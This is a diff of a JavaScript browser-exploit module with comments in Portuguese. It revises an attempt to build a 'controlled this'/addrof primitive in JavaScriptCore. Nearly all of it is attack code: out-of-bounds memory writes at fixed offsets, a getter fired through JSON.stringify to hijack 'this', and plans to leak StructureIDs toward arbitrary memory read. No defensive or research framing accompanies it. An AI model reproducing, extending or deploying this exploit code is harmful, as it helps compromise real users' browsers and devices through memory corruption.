@@ -14,212 +14,203 @@ import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 // ============================================================
 // DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
 // ============================================================
-const FNAME_MAIN = "ExploitLogic_v9.3";
+const FNAME_MAIN = "ExploitLogic_v9.4";
 
-// --- Configurações para "Controlled This" ---
-const GETTER_PROPERTY_NAME_ON_PROTOTYPE = "AAAA_GetterPropertyOnPrototype_v93"; // Getter em Object.prototype
-const CONTROLLED_THIS_PLANT_OFFSET_0x6C = 0x6C;
-const CONTROLLED_THIS_CORRUPTION_OFFSET_TRIGGER = 0x70;
-const CONTROLLED_THIS_CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
+const ADDROF_TEST_GETTER_NAME = "AAAA_GetterForAddrofTest_v94";
+const ADDROF_PLANT_OFFSET_0x6C = 0x6C;
+const ADDROF_CORRUPTION_OFFSET_TRIGGER = 0x70;
+const ADDROF_CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
 
-// --- Globais para "Controlled This" ---
-let controlled_this_getter_called_flag = false;
-let controlled_this_leaked_value = null; // O valor que 'this' se torna
+let addrof_test_getter_called_flag = false;
+let addrof_test_this_at_getter_entry = null; // 'this' na entrada do getter
+let addrof_test_leaked_qword_from_0x6C = null; // O QWORD que plantamos em 0x6C
+let addrof_test_this_became_qword = false; // Flag se 'this' se tornou o QWORD
+
+// Variável de módulo para o SID, garantindo que esteja declarada.
+let discovered_uint32array_structure_id = null; // Será preenchido se a descoberta for bem-sucedida
 
 // ============================================================
-// PRIMITIVA "CONTROLLED THIS"
+// FUNÇÃO DE TESTE "ADDROF" (CONTROLLED THIS)
 // ============================================================
 
-function setupControlledThisGetterOnPrototype(expected_this_value_planted) {
-    const FNAME_SETUP_GETTER = `${FNAME_MAIN}.setupControlledThisGetterOnPrototype`;
-    controlled_this_getter_called_flag = false;
-    controlled_this_leaked_value = null;
+async function attemptAddrofPrimitive_v94(value_to_plant_at_0x6C) {
+    const FNAME_ATTEMPT = `${FNAME_MAIN}.attemptAddrofPrimitive_v94`;
+    logS3(`--- Iniciando ${FNAME_ATTEMPT}: Tentando "Controlled This". Plantando em 0x6C: ${value_to_plant_at_0x6C.toString(true)} ---`, "test", FNAME_ATTEMPT);
 
-    Object.defineProperty(Object.prototype, GETTER_PROPERTY_NAME_ON_PROTOTYPE, {
-        configurable: true,
-        enumerable: true, // Manter enumerável para teste
-        get: function () {
-            controlled_this_getter_called_flag = true;
-            // 'this' aqui é o objeto no qual a propriedade foi acessada (o 'victimObjectWithToJSON')
-            logS3(`[GETTER ${GETTER_PROPERTY_NAME_ON_PROTOTYPE}]: ACIONADO! 'this' inicial (objeto que tem toJSON): ${this}`, "good", FNAME_SETUP_GETTER);
-            
-            // A hipótese é que a "mágica" da corrupção pode ter alterado
-            // algum estado global ou o próprio 'this' de forma sutil
-            // que o exploit original capturava.
-            // Para esta primitiva, o mais importante é que o getter seja chamado.
-            // O valor que 'this' se torna *após a mágica* é o que seu log v18a indicava como sendo o valor plantado.
-            // No momento, só podemos capturar 'this' na entrada do getter.
-            controlled_this_leaked_value = this; // Captura o 'this' do objeto que tem o método toJSON
-
-            logS3(`[GETTER ${GETTER_PROPERTY_NAME_ON_PROTOTYPE}]: 'this' capturado (objeto com toJSON): ${isAdvancedInt64Object(this) ? this.toString(true) : String(this)}`, "leak", FNAME_SETUP_GETTER);
-            logS3(`[GETTER ${GETTER_PROPERTY_NAME_ON_PROTOTYPE}]: Valor que foi plantado em 0x6C (esperado como 'this' mágico): ${isAdvancedInt64Object(expected_this_value_planted) ? expected_this_value_planted.toString(true) : toHex(expected_this_value_planted)}`, "info", FNAME_SETUP_GETTER);
-
-            // Se a "mágica" já ocorreu e 'this' é o valor plantado (improvável no início do getter)
-            if (isAdvancedInt64Object(expected_this_value_planted) && isAdvancedInt64Object(this) && this.equals(expected_this_value_planted)) {
-                 logS3(`[GETTER]: 'this' JÁ É o valor plantado!`, "vuln", FNAME_SETUP_GETTER);
-            }
-            return "valor_do_getter_no_prototipo";
-        }
-    });
-    logS3(`Getter '${GETTER_PROPERTY_NAME_ON_PROTOTYPE}' configurado em Object.prototype (enumerável).`, "info", FNAME_SETUP_GETTER);
-}
-
-function cleanupControlledThisGetterOnPrototype() {
-    delete Object.prototype[GETTER_PROPERTY_NAME_ON_PROTOTYPE];
-}
-
-async function attemptControlledThisViaToJSON(value_to_plant_at_0x6C) {
-    const FNAME_ATTEMPT = `${FNAME_MAIN}.attemptControlledThisViaToJSON`;
-    logS3(`--- Tentando controlar 'this' (v9.3 via toJSON). Plantando em 0x6C: ${isAdvancedInt64Object(value_to_plant_at_0x6C) ? value_to_plant_at_0x6C.toString(true) : toHex(value_to_plant_at_0x6C)} ---`, "test", FNAME_ATTEMPT);
+    addrof_test_getter_called_flag = false;
+    addrof_test_this_at_getter_entry = null;
+    addrof_test_leaked_qword_from_0x6C = null; // Armazena o valor que plantamos para comparação
+    addrof_test_this_became_qword = false;
 
     if (!oob_array_buffer_real) {
         await triggerOOB_primitive();
     }
 
     // 1. Plantar o valor em 0x6C
-    oob_write_absolute(CONTROLLED_THIS_PLANT_OFFSET_0x6C, value_to_plant_at_0x6C, isAdvancedInt64Object(value_to_plant_at_0x6C) ? 8 : 4);
-    if (!isAdvancedInt64Object(value_to_plant_at_0x6C)) {
-        oob_write_absolute(CONTROLLED_THIS_PLANT_OFFSET_0x6C + 4, 0, 4); // Zera parte alta se for número 32bit
-    }
-    logS3(`   Valor plantado em ${toHex(CONTROLLED_THIS_PLANT_OFFSET_0x6C)}.`, "info", FNAME_ATTEMPT);
+    logS3(`Plantando QWORD ${value_to_plant_at_0x6C.toString(true)} em ${toHex(ADDROF_PLANT_OFFSET_0x6C)}`, "info", FNAME_ATTEMPT);
+    oob_write_absolute(ADDROF_PLANT_OFFSET_0x6C, value_to_plant_at_0x6C, 8);
+    addrof_test_leaked_qword_from_0x6C = oob_read_absolute(ADDROF_PLANT_OFFSET_0x6C, 8); // Confirma o que está lá
 
-    // 2. Configurar o getter em Object.prototype
-    setupControlledThisGetterOnPrototype(value_to_plant_at_0x6C);
+    // 2. Criar o objeto com o getter como propriedade PRÓPRIA
+    const getterObject = {
+        // Não precisa ser enumerável para ser chamado por JSON.stringify se for uma propriedade própria
+        get [ADDROF_TEST_GETTER_NAME]() {
+            addrof_test_getter_called_flag = true;
+            addrof_test_this_at_getter_entry = this; // Captura 'this' na entrada
+            logS3(`[GETTER ${ADDROF_TEST_GETTER_NAME}]: ACIONADO! 'this' na entrada: ${this}`, "good", FNAME_ATTEMPT);
 
-    // 3. Criar um objeto vítima com um método toJSON que acessa a propriedade do getter
-    const victimObjectWithToJSON = {
-        some_data: "data_do_objeto_vitima",
-        toJSON: function() {
-            logS3(`[victim.toJSON]: Chamado! Tentando acessar this.${GETTER_PROPERTY_NAME_ON_PROTOTYPE}`, "info", FNAME_ATTEMPT);
-            // Ao acessar this.GETTER_PROPERTY_NAME_ON_PROTOTYPE, o getter em Object.prototype deve ser acionado.
-            // O 'this' dentro do getter será 'victimObjectWithToJSON'.
-            // A "mágica" (se ocorrer) é que este 'this' (victimObjectWithToJSON) é de alguma forma
-            // substituído ou seu valor se torna o que está em 0x6C durante a execução do getter.
-            const val = this[GETTER_PROPERTY_NAME_ON_PROTOTYPE];
-            logS3(`[victim.toJSON]: Getter retornou: ${val}`, "info", FNAME_ATTEMPT);
-            return { custom_serialization: "toJSON foi executado", getter_val: val };
+            // A hipótese do seu log addrofValidationAttempt_v18a é que, após alguma "mágica",
+            // 'this' (ou um valor derivado dele) se torna o que estava em 0x6C.
+            // Vamos simular a tentativa de ler de 'this' como se fosse um offset,
+            // e verificar se 'this' é igual ao valor plantado.
+
+            const valuePlanted = addrof_test_leaked_qword_from_0x6C; // O QWORD que realmente está em 0x6C
+
+            logS3(`  [GETTER]: Valor que ESTAVA em 0x6C (e que esperamos que 'this' se torne): ${valuePlanted.toString(true)}`, "info", FNAME_ATTEMPT);
+
+            // O seu log v18a indicou que "this se tornou: 0x180a180a00000000".
+            // Vamos assumir que 'this' PODE ter sido modificado pela "mágica" até este ponto.
+            // Para o teste, precisamos verificar se 'this' (atual) é igual ao valuePlanted.
+            // O log v18a é um pouco confuso sobre quando 'this' muda.
+            // Vamos assumir que a comparação deve ser feita com o 'this' atual.
+            if (isAdvancedInt64Object(this) && this.equals(valuePlanted)) {
+                addrof_test_this_became_qword = true;
+                logS3(`  [GETTER]: CONFIRMADO! 'this' ATUAL é IGUAL ao valor lido de 0x6C: ${this.toString(true)}`, "vuln", FNAME_ATTEMPT);
+            } else {
+                logS3(`  [GETTER]: AVISO! 'this' ATUAL (${isAdvancedInt64Object(this) ? this.toString(true) : String(this)}) NÃO é igual ao valor lido de 0x6C (${valuePlanted.toString(true)}).`, "warn", FNAME_ATTEMPT);
+            }
+
+            // Lógica de cópia do v18a (tentativa de ler de 'this' como offset e copiar para oob_buffer[0])
+            // Isso é para ver o que o 'this' (se for um offset válido) aponta.
+            // Se 'this' se tornou o QWORD de 0x6C, e esse QWORD for um offset grande, esta leitura falhará ou lerá lixo.
+            try {
+                let offset_from_this = 0;
+                if (isAdvancedInt64Object(this)) {
+                    offset_from_this = this.low(); // O v18a parecia usar .low()
+                    // offset_from_this = this.toNumber(); // CUIDADO: Perda de precisão
+                } else if (typeof this === 'number') {
+                    offset_from_this = this;
+                }
+
+                if (offset_from_this >= 0 && offset_from_this < oob_array_buffer_real.byteLength - 8) {
+                    const val_at_this_ptr = oob_read_absolute(offset_from_this, 8);
+                    logS3(`  [GETTER]: Tentando ler de 'this' como offset ${toHex(offset_from_this)}: valor = ${val_at_this_ptr.toString(true)}`, "leak", FNAME_ATTEMPT);
+                    oob_write_absolute(0x0, val_at_this_ptr, 8); // Copia para o início do oob_buffer
+                    logS3(`  [GETTER]: Conteúdo de 'this' (como offset) copiado para oob_buffer[0].`, "info", FNAME_ATTEMPT);
+                } else {
+                    logS3(`  [GETTER]: 'this' (${isAdvancedInt64Object(this) ? this.toString(true) : String(this)}) não é um offset válido dentro do oob_buffer para leitura.`, "warn", FNAME_ATTEMPT);
+                    oob_write_absolute(0x0, AdvancedInt64.Zero, 8); // Escreve zero se não puder ler
+                }
+            } catch (e_getter_read) {
+                logS3(`  [GETTER]: Erro ao tentar ler/escrever usando 'this' como offset: ${e_getter_read.message}`, "error", FNAME_ATTEMPT);
+                try { oob_write_absolute(0x0, AdvancedInt64.Zero, 8); } catch(e){} // Escreve zero em caso de erro
+            }
+            return "valor_do_getter_com_prop_propria";
         }
     };
 
-    // 4. TESTE PRELIMINAR: Acionar getter via toJSON ANTES da corrupção em 0x70
-    logS3(`TESTE PRELIMINAR: Acionando getter via toJSON ANTES da corrupção em 0x70...`, "info", FNAME_ATTEMPT);
-    controlled_this_getter_called_flag = false;
-    controlled_this_leaked_value = null;
-    let stringified_test_pre;
-    try {
-        stringified_test_pre = JSON.stringify(victimObjectWithToJSON);
-        logS3(`TESTE PRELIMINAR: JSON.stringify (pre-corrupção) resultou em: ${stringified_test_pre ? stringified_test_pre.substring(0,100) : "N/A"}`, "info", FNAME_ATTEMPT);
-        logS3(`TESTE PRELIMINAR: Flag do getter (pre-corrupção): ${controlled_this_getter_called_flag}`, "info", FNAME_ATTEMPT);
-        if (controlled_this_getter_called_flag) {
-            logS3(`TESTE PRELIMINAR: GETTER FOI CHAMADO (pre-corrupção). 'this' capturado no getter: ${isAdvancedInt64Object(controlled_this_leaked_value) ? controlled_this_leaked_value.toString(true) : String(controlled_this_leaked_value)}`, "good", FNAME_ATTEMPT);
-        } else {
-            logS3(`TESTE PRELIMINAR: GETTER NÃO FOI CHAMADO (pre-corrupção).`, "error", FNAME_ATTEMPT);
-        }
-    } catch (e_test_pre) {
-        logS3(`TESTE PRELIMINAR: Erro durante JSON.stringify (pre-corrupção): ${e_test_pre.message}`, "error", FNAME_ATTEMPT);
-    }
-
-    // 5. Acionar a corrupção principal em 0x70
-    logS3(`CORRUPÇÃO PRINCIPAL: Acionando em ${toHex(CONTROLLED_THIS_CORRUPTION_OFFSET_TRIGGER)} com ${CONTROLLED_THIS_CORRUPTION_VALUE_TRIGGER.toString(true)}`, "info", FNAME_ATTEMPT);
-    oob_write_absolute(CONTROLLED_THIS_CORRUPTION_OFFSET_TRIGGER, CONTROLLED_THIS_CORRUPTION_VALUE_TRIGGER, 8);
+    // 3. Acionar a corrupção principal em 0x70
+    logS3(`Acionando corrupção em ${toHex(ADDROF_CORRUPTION_OFFSET_TRIGGER)} com ${ADDROF_CORRUPTION_VALUE_TRIGGER.toString(true)}`, "info", FNAME_ATTEMPT);
+    oob_write_absolute(ADDROF_CORRUPTION_OFFSET_TRIGGER, ADDROF_CORRUPTION_VALUE_TRIGGER, 8);
     await PAUSE_S3(50);
 
-    // 6. TESTE PRINCIPAL: Acionar getter via toJSON APÓS corrupção em 0x70
-    logS3(`TESTE PRINCIPAL: Acionando getter via toJSON APÓS corrupção em 0x70...`, "info", FNAME_ATTEMPT);
-    controlled_this_getter_called_flag = false; // Resetar flag
-    controlled_this_leaked_value = null;    // Resetar valor
-    let stringified_main_test;
+    // 4. Acionar o getter usando JSON.stringify no objeto que TEM o getter
+    let stringified_victim;
     try {
-        stringified_main_test = JSON.stringify(victimObjectWithToJSON); // Usa o mesmo objeto
-    } catch (e_main) {
-        logS3(`TESTE PRINCIPAL: Erro durante JSON.stringify (pós-corrupção): ${e_main.message}`, "warn", FNAME_ATTEMPT);
+        logS3(`Tentando acionar getter via JSON.stringify(getterObject)...`, "info", FNAME_ATTEMPT);
+        stringified_victim = JSON.stringify(getterObject);
+    } catch (e) {
+        logS3(`Erro durante JSON.stringify para acionar getter: ${e.message}`, "warn", FNAME_ATTEMPT);
     }
 
-    logS3(`TESTE PRINCIPAL: JSON.stringify (pós-corrupção) resultou em: ${stringified_main_test ? stringified_main_test.substring(0,100) : "N/A"}`, "info", FNAME_ATTEMPT);
-    logS3(`TESTE PRINCIPAL: Flag do getter (pós-corrupção): ${controlled_this_getter_called_flag}`, "info", FNAME_ATTEMPT);
-    logS3(`TESTE PRINCIPAL: Valor de 'this' capturado no getter (pós-corrupção): ${isAdvancedInt64Object(controlled_this_leaked_value) ? controlled_this_leaked_value.toString(true) : String(controlled_this_leaked_value)}`, "leak", FNAME_ATTEMPT);
+    logS3(`JSON.stringify(getterObject) resultou em: ${stringified_victim ? stringified_victim.substring(0,100) : "N/A"}`, "info", FNAME_ATTEMPT);
+    logS3(`Flag do getter '${ADDROF_TEST_GETTER_NAME}': ${addrof_test_getter_called_flag}`, "info", FNAME_ATTEMPT);
+    logS3(`'this' na entrada do getter: ${isAdvancedInt64Object(addrof_test_this_at_getter_entry) ? addrof_test_this_at_getter_entry.toString(true) : String(addrof_test_this_at_getter_entry)}`, "leak", FNAME_ATTEMPT);
+    logS3(`'this' se tornou o QWORD plantado? ${addrof_test_this_became_qword}`, "info", FNAME_ATTEMPT);
 
-    // A verificação de sucesso agora é mais complexa.
-    // O 'this' inicial no getter será 'victimObjectWithToJSON'.
-    // A "mágica" do seu exploit original (addrofValidationAttempt_v18a) é que, em algum ponto *durante ou após*
-    // o acionamento do getter, o valor de 'this' ou um valor relacionado se torna o que foi plantado em 0x6C.
-    // O log do v18a mostrava "Após alguma mágica interna, this se tornou: 0x180a180a00000000".
-    // Nossa 'controlled_this_leaked_value' captura 'this' na entrada do getter.
-    // Precisamos que o seu exploit v18a fizesse o 'this' *da entrada do getter* ser o valor plantado.
-    // Se a "mágica" acontece *depois* que o getter é chamado e o 'this' inicial é capturado,
-    // esta verificação não vai pegar o 'this' "mágico".
-    
-    let success = false;
-    if (controlled_this_getter_called_flag) { // Pelo menos o getter foi chamado no teste principal
-        // Se a sua "mágica" faz com que 'this' no getter (controlled_this_leaked_value)
-        // seja o valor plantado, a verificação abaixo funcionaria.
-        if (isAdvancedInt64Object(value_to_plant_at_0x6C) && isAdvancedInt64Object(controlled_this_leaked_value) && controlled_this_leaked_value.equals(value_to_plant_at_0x6C)) {
-            success = true;
-        } else if (!isAdvancedInt64Object(value_to_plant_at_0x6C) && controlled_this_leaked_value === value_to_plant_at_0x6C) {
-            success = true;
-        }
-    }
+    const qword_at_oob_start_after_getter = oob_read_absolute(0x0, 8);
+    logS3(`QWORD no início do oob_buffer APÓS getter: ${qword_at_oob_start_after_getter.toString(true)}`, "leak", FNAME_ATTEMPT);
 
-    if (success) {
-        logS3(`!!!! SUCESSO POTENCIAL "CONTROLLED THIS" (TESTE PRINCIPAL) !!!! O valor plantado ${isAdvancedInt64Object(value_to_plant_at_0x6C) ? value_to_plant_at_0x6C.toString(true) : toHex(value_to_plant_at_0x6C)} PARECE ter sido 'this' no getter.`, "vuln", FNAME_ATTEMPT);
-        document.title = `ControlledThis OK?: ${isAdvancedInt64Object(value_to_plant_at_0x6C) ? value_to_plant_at_0x6C.toString(true).substring(0,20) : toHex(value_to_plant_at_0x6C)}`;
-        return controlled_this_leaked_value;
+
+    if (addrof_test_getter_called_flag && addrof_test_this_became_qword) {
+        logS3(`!!!! SUCESSO "CONTROLLED THIS" !!!! O valor plantado ${addrof_test_leaked_qword_from_0x6C.toString(true)} foi 'this' no getter.`, "vuln", FNAME_ATTEMPT);
+        document.title = `ControlledThis OK: ${addrof_test_leaked_qword_from_0x6C.toString(true).substring(0,20)}`;
+        return addrof_test_leaked_qword_from_0x6C; // Retorna o valor que 'this' se tornou
     } else {
-        logS3("Falha na tentativa de 'Controlled This' (TESTE PRINCIPAL) ou 'this' não era o valor plantado.", "error", FNAME_ATTEMPT);
-        if (!controlled_this_getter_called_flag) {
-             document.title = "ControlledThis: Getter PÓS-CORRUPÇÃO NÃO CHAMADO";
-        } else {
-            document.title = "ControlledThis: 'this' PÓS-CORRUPÇÃO NÃO IGUAL ou getter não chamado";
-        }
+        logS3("Falha na tentativa de 'Controlled This'.", "error", FNAME_ATTEMPT);
+        if (!addrof_test_getter_called_flag) document.title = "ControlledThis: Getter NÃO CHAMADO";
+        else document.title = "ControlledThis: 'this' NÃO IGUAL";
         return null;
     }
 }
 
+
 // ============================================================
-// FUNÇÃO DE TESTE PRINCIPAL (Anteriormente discoverStructureIDs)
+// FUNÇÃO DE TESTE PRINCIPAL
 // ============================================================
-async function testControlledThisPrimitive() {
-    const FNAME_TEST_PRIMITIVE = `${FNAME_MAIN}.testControlledThisPrimitive`;
-    logS3(`--- Iniciando ${FNAME_TEST_PRIMITIVE} ---`, "test", FNAME_TEST_PRIMITIVE);
+export async function sprayAndInvestigateObjectExposure() { // Mantendo o nome da função exportada por consistência com runAllAdvancedTestsS3
+    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.mainTestLogic_v9.4`;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Teste da Primitiva "Controlled This" (Estilo v18a) ---`, "test", FNAME_CURRENT_TEST);
 
-    const marker_value_for_this = new AdvancedInt64(0xFEFEFEFE, 0x12121212);
-
-    logS3("Testando a primitiva 'Controlled This' usando toJSON...", "info", FNAME_TEST_PRIMITIVE);
-    let result = await attemptControlledThisViaToJSON(marker_value_for_this);
-
-    if (result && result.equals(marker_value_for_this)) {
-        logS3(`SUCESSO: Primitiva 'Controlled This' via toJSON funciona. 'this' no getter se tornou ${marker_value_for_this.toString(true)}.`, "vuln", FNAME_TEST_PRIMITIVE);
-    } else {
-        logS3("Falha ao confirmar a primitiva 'Controlled This' via toJSON.", "error", FNAME_TEST_PRIMITIVE);
+    // Garantir que a variável de módulo está acessível e definida
+    if (typeof discovered_uint32array_structure_id === 'undefined') {
+        // Isso não deveria acontecer se 'let discovered_uint32array_structure_id;' estiver no escopo do módulo.
+        // Mas para proteger contra erros de empacotamento ou escopo estranhos:
+        discovered_uint32array_structure_id = null;
     }
 
-    // Lógica de StructureID placeholder (para manter compatibilidade com chamadas anteriores)
-    logS3("AVISO: A descoberta REAL de StructureID ainda requer passos adicionais.", "warn", FNAME_TEST_PRIMITIVE);
-    if (!discovered_uint32array_structure_id) {
-        discovered_uint32array_structure_id = 0xBADBAD00 | 27; // Placeholder
-        logS3(`Usando StructureID placeholder para Uint32Array: ${toHex(discovered_uint32array_structure_id)}`, "warn", FNAME_TEST_PRIMITIVE);
-    }
-}
-
-// ============================================================
-// FUNÇÃO PRINCIPAL DE EXPORTAÇÃO
-// ============================================================
-export async function sprayAndInvestigateObjectExposure() {
-    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.mainTestLogic_v9.3`;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Teste de "Controlled This" via toJSON ---`, "test", FNAME_CURRENT_TEST);
 
     try {
-        await testControlledThisPrimitive();
+        const marker_value_for_this_test = new AdvancedInt64(0x11223344, 0x55667788);
+        let result_controlled_this = await attemptAddrofPrimitive_v94(marker_value_for_this_test);
 
-        logS3("--- Foco atual é na primitiva 'CONTROLLED THIS' ---", "info", FNAME_CURRENT_TEST);
-        // Futuramente: reintegrar lógica de spray e corrupção de view aqui.
+        if (result_controlled_this && result_controlled_this.equals(marker_value_for_this_test)) {
+            logS3(`SUCESSO: Primitiva "Controlled This" confirmada. 'this' no getter se tornou: ${result_controlled_this.toString(true)}`, "vuln", FNAME_CURRENT_TEST);
+            logS3("  Isso significa que podemos controlar o 'this' de um getter para ser um QWORD arbitrário que plantamos.", "info", FNAME_CURRENT_TEST);
+            logS3("  Próximo passo seria usar isso para construir uma primitiva de leitura arbitrária (se 'this' for tratado como ponteiro pelo motor) ou addrof(real_object).", "info", FNAME_CURRENT_TEST);
+        
+            // TENTATIVA DE VAZAR STRUCTUREID USANDO A PRIMITIVA CONTROLLED THIS
+            // Para vazar o SID de um objeto (ex: sample_u32_array), precisamos:
+            // 1. De alguma forma, obter o endereço real do sample_u32_array (ou um offset para ele no oob_buffer).
+            //    Esta é a peça que ainda falta para um addrof completo.
+            // 2. Plantar esse endereço_real em 0x6C.
+            // 3. Chamar o getter. 'this' se tornaria endereço_real.
+            // 4. O getter modificado precisaria ler de 'this' + offset_do_SID e escrever no oob_buffer.
+
+            logS3("Simulando tentativa de vazar SID (ainda depende de obter endereço real do objeto):", "info", FNAME_CURRENT_TEST);
+            // let sample_u32 = new Uint32Array(1);
+            // Suponha que magicamente sabemos que sample_u32 está em oob_buffer_real + 0x1000
+            // const fake_address_of_sample_u32 = new AdvancedInt64(0x1000, 0x0);
+            // logS3(`Plantando ${fake_address_of_sample_u32.toString(true)} (suposto endereço de um U32Array) em 0x6C...`);
+            // await attemptAddrofPrimitive_v94(fake_address_of_sample_u32); // Chamar novamente com o "endereço"
+            
+            // Ler o que o getter (modificado) teria escrito em oob_buffer[0]
+            // const data_from_fake_addr_read = oob_read_absolute(0x0, 8);
+            // logS3(`   Dados lidos de oob_buffer[0] (suposto JSCell do objeto no fake_address): ${data_from_fake_addr_read.toString(true)}`);
+            // const potential_sid = data_from_fake_addr_read.low(); // Se JSCell.SID for o primeiro DWORD
+            // logS3(`   Potencial StructureID vazado: ${toHex(potential_sid)}`);
+            // if (potential_sid !== 0 && potential_sid !== 0xFFFFFFFF) {
+            //    discovered_uint32array_structure_id = potential_sid;
+            // }
+
+        } else {
+            logS3("Falha ao confirmar a primitiva 'Controlled This'.", "error", FNAME_CURRENT_TEST);
+        }
+
+        if (!discovered_uint32array_structure_id) {
+            // Este é o placeholder que você mencionou no log, vou manter o valor que você usou.
+             discovered_uint32array_structure_id = 0xBADBAD00 | 0x1b; // 0xbadbad1b do seu log
+            logS3(`AVISO: StructureID para Uint32Array NÃO foi descoberto. Usando placeholder: ${toHex(discovered_uint32array_structure_id)}`, "warn", FNAME_CURRENT_TEST);
+        } else {
+            logS3(`StructureID para Uint32Array (hipoteticamente descoberto): ${toHex(discovered_uint32array_structure_id)}`, "good", FNAME_CURRENT_TEST);
+        }
+
 
     } catch (e) {
         logS3(`ERRO CRÍTICO em ${FNAME_CURRENT_TEST}: ${e.message}`, "critical", FNAME_CURRENT_TEST);
         if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_CURRENT_TEST);
         document.title = `${FNAME_MAIN} FALHOU!`;
     } finally {
-        cleanupControlledThisGetterOnPrototype(); // Limpa o getter de Object.prototype
         clearOOBEnvironment();
         logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
     }
